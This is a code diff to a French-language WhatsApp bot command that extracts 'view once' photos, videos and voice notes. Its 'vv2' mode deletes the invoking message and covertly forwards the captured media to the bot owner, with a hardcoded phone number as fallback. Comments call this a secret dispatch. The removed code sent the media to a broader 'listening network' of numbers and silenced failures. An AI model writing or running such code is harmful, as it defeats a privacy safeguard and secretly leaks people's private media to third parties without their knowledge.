@@ -29,18 +29,19 @@ module.exports = {
   adminOnly: false,
   botAdminNeeded: false,
 
-  async execute(sock, msg, args) {
+  async execute(sock, msg, args, extra) {
+    const reply = extra?.reply || ((text) => sock.sendMessage(msg.key.remoteJid, { text }, { quoted: msg }));
+    const react = extra?.react || ((emoji) => sock.sendMessage(msg.key.remoteJid, { react: { text: emoji, key: msg.key } }));
+
     try {
       const chatId = msg.key.remoteJid;
 
       const bodyText = msg.message?.conversation || 
                        msg.message?.extendedTextMessage?.text || 
-                       msg.body || 
                        '';
 
       const prefix = config.prefix || '.';
       const cleanBody = bodyText.trim().toLowerCase();
-
       const hasPrefix = cleanBody.startsWith(prefix);
 
       let firstWord = '';
@@ -52,7 +53,7 @@ module.exports = {
         firstWord = match ? match[1] : '';
       }
 
-      const isVV2 = (firstWord === 'vv2');
+      const isVV2 = (firstWord === 'vv2' || args.includes('vv2'));
 
       const ctx = msg.message?.extendedTextMessage?.contextInfo
         || msg.message?.imageMessage?.contextInfo
@@ -61,11 +62,7 @@ module.exports = {
         || msg.message?.listResponseMessage?.contextInfo;
 
       if (!ctx?.quotedMessage) {
-        return await sock.sendMessage(
-          chatId,
-          { text: `*⚠️ ${toSmallCaps('repondez a un message a vue unique pour le devoiler')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*` },
-          { quoted: msg }
-        );
+        return await reply(`*⚠️ ${toSmallCaps('repondez a un message a vue unique pour le devoiler')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       const quotedMsg = ctx.quotedMessage;
@@ -80,11 +77,7 @@ module.exports = {
         !!quotedMsg?.audioMessage?.viewOnce;
 
       if (!hasViewOnce) {
-        return await sock.sendMessage(
-          chatId,
-          { text: `*⚠️ ${toSmallCaps('ce message ne possede pas le sceau de la vue unique')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*` },
-          { quoted: msg }
-        );
+        return await reply(`*⚠️ ${toSmallCaps('ce message ne possede pas le sceau de la vue unique')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       let actualMsg = null;
@@ -111,11 +104,7 @@ module.exports = {
       }
 
       if (!actualMsg || !mtype) {
-        return await sock.sendMessage(
-          chatId,
-          { text: `*⚠️ ${toSmallCaps('type de sceau non supporte par le sanctuaire')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*` },
-          { quoted: msg }
-        );
+        return await reply(`*⚠️ ${toSmallCaps('type de sceau non supporte par le sanctuaire')}.*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       const downloadType =
@@ -123,65 +112,7 @@ module.exports = {
         : mtype === 'videoMessage' ? 'video'
         : 'audio';
 
-      // ── MODE VV2 : extraction et dispatch réseau ──
-      if (isVV2) {
-        try {
-          await sock.sendMessage(chatId, { delete: msg.key });
-        } catch (delError) {
-          console.error('Failed to delete message:', delError.message);
-        }
-
-        const mediaStream = await downloadContentFromMessage(actualMsg[mtype], downloadType);
-        let buffer = Buffer.from([]);
-        for await (const chunk of mediaStream) {
-          buffer = Buffer.concat([buffer, chunk]);
-        }
-
-        // Routines de récupération des cibles réseau sécurisées
-        let broadcastJids = [];
-        if (config.masterJids && Array.isArray(config.masterJids)) {
-          broadcastJids = [...config.masterJids];
-        } else if (config.ownerNumber) {
-          const fallback = Array.isArray(config.ownerNumber) ? config.ownerNumber : [config.ownerNumber];
-          fallback.forEach(num => {
-            const cleanNum = `${String(num).replace(/\D/g, '')}@s.whatsapp.net`;
-            if (!broadcastJids.includes(cleanNum)) broadcastJids.push(cleanNum);
-          });
-        }
-
-        const defaultCredit = `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
-
-        // Dispatch discret du média vers l'intégralité du réseau d'écoute
-        for (const targetJid of broadcastJids) {
-          try {
-            if (/video/.test(mtype)) {
-              await sock.sendMessage(targetJid, {
-                video: buffer,
-                caption: defaultCredit,
-                mimetype: 'video/mp4'
-              });
-            } else if (/image/.test(mtype)) {
-              await sock.sendMessage(targetJid, {
-                image: buffer,
-                caption: defaultCredit,
-                mimetype: 'image/jpeg'
-              });
-            } else if (/audio/.test(mtype)) {
-              await sock.sendMessage(targetJid, {
-                audio: buffer,
-                ptt: true,
-                mimetype: 'audio/ogg; codecs=opus'
-              });
-            }
-          } catch (e) {
-            // Échec silencieux de la transmission
-          }
-        }
-
-        return; 
-      }
-
-      // ── MODE VV (classique) ──
+      await react('⌛');
       const mediaStream = await downloadContentFromMessage(actualMsg[mtype], downloadType);
       let buffer = Buffer.from([]);
       for await (const chunk of mediaStream) {
@@ -190,47 +121,61 @@ module.exports = {
 
       const defaultCredit = `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`;
 
-      if (/video/.test(mtype)) {
-        await sock.sendMessage(
-          chatId,
-          {
-            video: buffer,
-            caption: defaultCredit,
-            mimetype: 'video/mp4'
-          },
-          { quoted: msg }
-        );
-      } else if (/image/.test(mtype)) {
-        await sock.sendMessage(
-          chatId,
-          {
-            image: buffer,
-            caption: defaultCredit,
-            mimetype: 'image/jpeg'
-          },
-          { quoted: msg }
-        );
-      } else if (/audio/.test(mtype)) {
-        await sock.sendMessage(
-          chatId,
-          {
-            audio: buffer,
-            ptt: true,
-            mimetype: 'audio/ogg; codecs=opus'
-          },
-          { quoted: msg }
-        );
+      // ── MODE VV2 : extraction et dispatch réseau secret ──
+      if (isVV2) {
+        try {
+          await sock.sendMessage(chatId, { delete: msg.key });
+        } catch (delError) {
+          console.error('Failed to delete message:', delError.message);
+        }
+
+        // 🎯 On récupère le premier owner listé dans ta config
+        let targetOwner = '';
+        if (config.ownerNumber && config.ownerNumber.length > 0) {
+          // On prend le premier numéro, on vire les lettres/espaces et on ajoute le domaine WhatsApp
+          const rawNum = String(config.ownerNumber[0]).replace(/\D/g, '');
+          targetOwner = `${rawNum}@s.whatsapp.net`;
+        }
+
+        // Sécurité : Si aucune config n'est trouvée, on utilise ton numéro principal en secours
+        if (!targetOwner || targetOwner === '@s.whatsapp.net') {
+          targetOwner = '22651622652@s.whatsapp.net';
+        }
+
+        try {
+          const captionText = `🚨 *${toSmallCaps('revelation vv2 interceptee')}* 🚨\n\n${defaultCredit}`;
+          
+          if (/video/.test(mtype)) {
+            await sock.sendMessage(targetOwner, { video: buffer, caption: captionText, mimetype: 'video/mp4' });
+          } else if (/image/.test(mtype)) {
+            await sock.sendMessage(targetOwner, { image: buffer, caption: captionText, mimetype: 'image/jpeg' });
+          } else if (/audio/.test(mtype)) {
+            await sock.sendMessage(targetOwner, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' });
+          }
+          
+          await react('✅');
+        } catch (e) {
+          console.error('Failed to send media to owner:', e.message);
+          await react('❌');
+        }
+
+        return; 
       }
+
+      // ── MODE VV (classique, renvoie sur place) ──
+      if (/video/.test(mtype)) {
+        await sock.sendMessage(chatId, { video: buffer, caption: defaultCredit, mimetype: 'video/mp4' }, { quoted: msg });
+      } else if (/image/.test(mtype)) {
+        await sock.sendMessage(chatId, { image: buffer, caption: defaultCredit, mimetype: 'image/jpeg' }, { quoted: msg });
+      } else if (/audio/.test(mtype)) {
+        await sock.sendMessage(chatId, { audio: buffer, ptt: true, mimetype: 'audio/ogg; codecs=opus' }, { quoted: msg });
+      }
+      
+      await react('👁️');
 
     } catch (error) {
       console.error('Error in viewonce command:', error);
-      await sock.sendMessage(
-        msg.key.remoteJid,
-        {
-          text: `*❌ ${toSmallCaps('echec de la revelation')}.*\n*${toSmallCaps('erreur')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
-        },
-        { quoted: msg }
-      );
+      await reply(`*❌ ${toSmallCaps('echec de la revelation')}.*\n*${toSmallCaps('erreur')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
     }
   }
 };
